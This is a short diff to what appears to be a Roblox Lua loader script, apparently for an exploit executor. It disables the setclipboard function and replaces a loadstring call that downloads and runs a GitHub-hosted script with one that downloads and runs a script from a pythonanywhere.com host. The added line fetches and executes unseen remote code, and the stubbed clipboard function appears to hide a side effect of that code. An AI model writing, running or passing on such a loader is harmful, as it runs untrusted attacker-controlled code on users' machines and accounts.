@@ -1,2 +1,2 @@
 setclipboard = function() end
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/e9f48ca697cdb3ab851bafee.lua'))()
+loadstring(game:HttpGet("https://vlorplol.pythonanywhere.com/mainscript/qM5smxOesQj362C.lua"))()
